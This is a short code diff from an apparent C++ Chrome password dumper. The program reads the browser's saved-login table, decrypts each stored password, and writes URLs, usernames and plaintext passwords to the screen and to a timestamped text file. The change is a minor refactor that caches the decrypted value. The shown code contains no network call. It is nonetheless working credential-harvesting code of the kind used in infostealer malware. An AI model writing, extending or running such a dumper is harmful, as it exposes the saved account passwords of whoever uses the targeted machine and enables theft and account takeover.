@@ -88,16 +88,18 @@ int main() {
     string outfile = "ChromePasswd-"+ to_string((unsigned)time(0)) + ".txt";
     ofstream out(outfile);
 
+    string decrypt;
     for (int i = 1; i <= nrows; i++) {
+        decrypt = decrypt_password(results[i * ncols + 3], key);
         cout << "origin_url: " << results[i * ncols] << "\n";
         cout << "action_url: " << results[i * ncols + 1] << "\n";
         cout << "username_value: " << results[i * ncols + 2] << "\n";
-        cout << "password_value: " << decrypt_password(results[i * ncols + 3], key) << "\n\n";
+        cout << "password_value: " << decrypt << "\n\n";
 
         out << "origin_url: " << results[i * ncols] << "\n";
         out << "action_url: " << results[i * ncols + 1] << "\n";
         out << "username_value: " << results[i * ncols + 2] << "\n";
-        out << "password_value: " << decrypt_password(results[i * ncols + 3], key) << "\n\n";
+        out << "password_value: " << decrypt << "\n\n";
     }
 
     sqlite3_free_table(results);
